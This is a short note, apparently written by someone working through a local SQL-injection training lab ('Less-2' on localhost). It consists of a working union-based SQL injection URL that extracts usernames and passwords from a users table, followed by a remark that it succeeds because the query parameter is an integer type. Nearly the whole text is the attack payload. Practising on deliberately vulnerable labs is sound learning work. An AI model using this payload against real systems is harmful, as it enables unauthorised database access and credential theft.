http://localhost:8080/Less-2/?id=-2 and 0 union select 1,group_concat(username,0x3a,password),3 from (select username,password from users limit 0,10)a--+

this is working and i guess the diff is that its integer type query.